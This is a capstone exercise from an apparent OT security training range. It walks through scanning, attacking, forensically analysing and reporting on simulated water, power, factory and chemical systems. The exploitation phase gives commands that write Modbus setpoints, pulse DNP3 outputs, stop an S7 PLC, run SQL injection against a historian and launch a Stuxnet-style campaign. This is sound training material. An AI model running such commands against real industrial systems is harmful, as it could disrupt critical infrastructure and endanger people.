# Lab 9: Capstone - Full OT Security Assessment

## Overview
| Property | Value |
|----------|-------|
| Duration | 4-8 hours |
| Difficulty | Expert |
| Format | Comprehensive Assessment |
| Scope | All VULNOT Scenarios |

## Learning Objectives
This capstone exercise integrates all skills from the previous labs:
1. Conduct full OT security assessment
2. Identify vulnerabilities across multiple protocols
3. Execute coordinated multi-protocol attacks
4. Perform forensic analysis
5. Map findings to compliance frameworks
6. Generate professional assessment report

## Pre-requisites
Complete Labs 1-8 or equivalent experience with:
- Modbus TCP
- DNP3
- S7comm
- OPC UA
- BACnet
- EtherNet/IP
- MQTT
- OT Forensics

## Scenario Background

You have been engaged to perform a comprehensive OT security assessment for **Mjolnir Training**, a multi-facility operation consisting of:

1. **Water Treatment Plant** - Modbus TCP
2. **Power Substation** - DNP3
3. **Manufacturing Facility** - S7comm
4. **Chemical Reactor** - OPC UA
5. **Corporate Building** - BACnet
6. **Packaging & Distribution** - EtherNet/IP
7. **IIoT Sensor Network** - MQTT
8. **Central Historian** - HTTP API

### Network Diagram
```
                         ┌─────────────────┐
                         │   Corporate IT  │
                         │   192.168.0.0/24│
                         └────────┬────────┘
                                  │
                         ┌────────▼────────┐
                         │    Firewall     │
                         │   (Simulated)   │
                         └────────┬────────┘
                                  │
     ┌────────┬─────────┬─────────┼─────────┬─────────┬────────┐
     │        │         │         │         │         │        │
┌────▼───┐┌───▼───┐┌────▼───┐┌────▼───┐┌────▼───┐┌────▼───┐┌───▼────┐
│ Water  ││ Power ││Factory ││Reactor ││Building││Package ││  IIoT  │
│10.0.1.x││10.0.2.x││10.0.3.x││10.0.4.x││10.0.5.x││10.0.6.x││10.0.7.x│
└────────┘└───────┘└────────┘└────────┘└────────┘└────────┘└────────┘
                                  │
                         ┌────────▼────────┐
                         │   Historian     │
                         │   10.0.9.10     │
                         └─────────────────┘
```

## Phase 1: Reconnaissance (60 min)

### Task 1.1: Network Discovery
Scan all OT networks to identify assets:

```bash
# From red team workstation
docker exec -it vulnot-redteam bash

# Scan each subnet
for subnet in 1 2 3 4 5 6 7 9; do
  echo "=== Scanning 10.0.$subnet.0/24 ==="
  nmap -sT -p 102,502,4840,20000,44818,47808,1883,8080 10.0.$subnet.0/24
done
```

### Task 1.2: Protocol Identification
Use protocol-specific tools to fingerprint each device:

```bash
# Modbus
vulnot-scan -n 10.0.1.0/24

# DNP3
vulnot-dnp3 scan -n 10.0.2.0/24

# S7comm
vulnot-s7 scan -n 10.0.3.0/24

# OPC UA
vulnot-opcua scan -n 10.0.4.0/24

# BACnet
vulnot-bacnet scan -n 10.0.5.0/24

# EtherNet/IP
vulnot-enip scan -n 10.0.6.0/24

# MQTT
vulnot-mqtt scan -n 10.0.7.0/24

# Historian
vulnot-historian enum -t 10.0.9.10
```

### Deliverable 1.1: Asset Inventory
Create a spreadsheet with:
- IP Address
- Protocol
- Device Type
- Firmware Version (if available)
- Open Ports

## Phase 2: Vulnerability Assessment (90 min)

### Task 2.1: Authentication Testing
Test each protocol for authentication bypass:

| Protocol | Test Command | Expected Finding |
|----------|--------------|------------------|
| Modbus | `vulnot-read -t 10.0.1.10` | No auth required |
| DNP3 | `vulnot-dnp3 read -t 10.0.2.10` | No auth required |
| S7comm | `vulnot-s7 info -t 10.0.3.10` | No auth required |
| OPC UA | `vulnot-opcua browse -t 10.0.4.10` | Anonymous allowed |
| MQTT | `vulnot-mqtt subscribe -b 10.0.7.5 -t '#'` | No auth required |

### Task 2.2: Access Control Testing
Test for unauthorized write capabilities:

```bash
# Modbus - try to write (but don't execute yet)
vulnot-write -t 10.0.1.10 -r 1 -v 100 --simulate

# S7comm - check if CPU stop is possible
vulnot-s7 info -t 10.0.3.10 --check-protection
```

### Task 2.3: Historian Security
Test historian for:
- SQL injection
- Unauthenticated access
- Backup download

```bash
vulnot-historian sqli -t 10.0.9.10 --type table_enum
```

### Deliverable 2.1: Vulnerability Report
For each vulnerability:
- CVSS score
- Affected assets
- Proof of concept
- Recommendation

## Phase 3: Exploitation (90 min)

### ⚠️ IMPORTANT
This is a training environment. In real assessments, exploitation should only occur with explicit written authorization.

### Task 3.1: Modbus Exploitation
1. Read current process values
2. Modify a non-critical setpoint
3. Observe effect in historian

```bash
vulnot-read -t 10.0.1.10 -s 0 -c 10
vulnot-write -t 10.0.1.10 -r 1 -v 75
```

### Task 3.2: DNP3 Exploitation
1. Read RTU status
2. Execute Direct Operate on binary output

```bash
vulnot-dnp3 read -t 10.0.2.10
vulnot-dnp3 control -t 10.0.2.10 --point 0 --action pulse
```

### Task 3.3: S7comm Exploitation
1. Read data block
2. Modify production speed
3. Stop CPU (carefully!)

```bash
vulnot-s7 read -t 10.0.3.10 --db 1 --offset 0 --type REAL
vulnot-s7 write -t 10.0.3.10 --db 1 --offset 0 --type REAL --value 50.0
vulnot-s7 stop -t 10.0.3.10
```

### Task 3.4: Multi-Protocol Attack
Execute APT campaign:

```bash
vulnot-apt start stuxnet_style
vulnot-apt run
```

### Deliverable 3.1: Attack Documentation
- Attack timeline
- Commands executed
- Evidence collected
- Impact observed

## Phase 4: Forensic Analysis (60 min)

### Task 4.1: Collect Evidence
```bash
vulnot-forensics acquire-plc -t 10.0.3.10 -p s7comm -c CAPSTONE-001
vulnot-forensics analyze-historian -H 10.0.9.10 -c CAPSTONE-001
```

### Task 4.2: Timeline Reconstruction
```bash
vulnot-forensics timeline -c CAPSTONE-001
```

### Task 4.3: IOC Extraction
Document all indicators:
- Source IPs
- Command signatures
- Time windows
- Modified values

### Deliverable 4.1: Forensic Report
- Executive summary
- Timeline of events
- IOC list
- MITRE ATT&CK mapping

## Phase 5: Compliance Mapping (45 min)

### Task 5.1: IEC 62443 Assessment
Map findings to IEC 62443-3-3 requirements:

| Finding | Requirement | Status |
|---------|-------------|--------|
| No Modbus auth | SR 1.1, SR 1.2 | Non-Compliant |
| No encryption | SR 4.1, SR 4.3 | Non-Compliant |
| Flat network | SR 5.1, SR 5.2 | Non-Compliant |
| No IDS | SR 6.2 | Partial |

### Task 5.2: NIST CSF Mapping
Map to NIST Cybersecurity Framework:

| Function | Category | Finding |
|----------|----------|---------|
| Identify | Asset Mgmt | Partial inventory |
| Protect | Access Control | No authentication |
| Detect | Monitoring | Limited visibility |
| Respond | IR Plan | No playbooks |
| Recover | Recovery Plan | Unknown |

### Deliverable 5.1: Compliance Gap Analysis
- Target security level
- Current state
- Gaps identified
- Remediation roadmap

## Phase 6: Reporting (60 min)

### Task 6.1: Executive Summary
Write 1-page executive summary covering:
- Assessment scope
- Key findings
- Risk rating
- Top 5 recommendations

### Task 6.2: Technical Report
Full technical report with:
- Methodology
- Detailed findings
- Evidence
- Recommendations

### Task 6.3: Remediation Roadmap
Priority-based remediation plan:

| Priority | Finding | Remediation | Timeline |
|----------|---------|-------------|----------|
| P1 | No authentication | Enable auth | 30 days |
| P1 | Network segmentation | Implement zones | 90 days |
| P2 | No encryption | Deploy TLS | 60 days |
| P2 | Missing IDS | Deploy OT IDS | 45 days |
| P3 | No logging | Enable audit | 30 days |

### Deliverable 6.1: Final Report
Professional assessment report suitable for client delivery.

## Scoring Rubric

| Phase | Points | Criteria |
|-------|--------|----------|
| Reconnaissance | 100 | Complete asset inventory |
| Vulnerability Assessment | 150 | All vulns identified with CVSS |
| Exploitation | 150 | Successful multi-protocol attack |
| Forensics | 100 | Complete timeline, IOCs |
| Compliance | 100 | IEC 62443 + NIST mapping |
| Reporting | 150 | Professional quality report |
| **Total** | **750** | |

## Bonus Objectives (+100 pts)

- [ ] Discover undocumented vulnerability (+25)
- [ ] Create custom IDS rule that detects your attack (+25)
- [ ] Write incident response playbook for findings (+25)
- [ ] Create remediation validation test (+25)

## Certification

Successful completion of this capstone with score ≥600 qualifies for:

**VULNOT OT Security Practitioner Certification**

## Appendix: Tool Reference

```bash
# Reconnaissance
vulnot-scan, vulnot-dnp3 scan, vulnot-s7 scan, vulnot-opcua scan
vulnot-bacnet scan, vulnot-enip scan, vulnot-mqtt scan

# Exploitation
vulnot-read, vulnot-write, vulnot-dnp3 control, vulnot-s7 stop
vulnot-opcua write, vulnot-mqtt publish, vulnot-historian inject

# Forensics
vulnot-forensics acquire-plc, analyze-pcap, timeline, preserve

# APT Simulation
vulnot-apt list, show, start, run

# Historian
vulnot-historian enum, sqli, exfil, delete
```

Good luck!
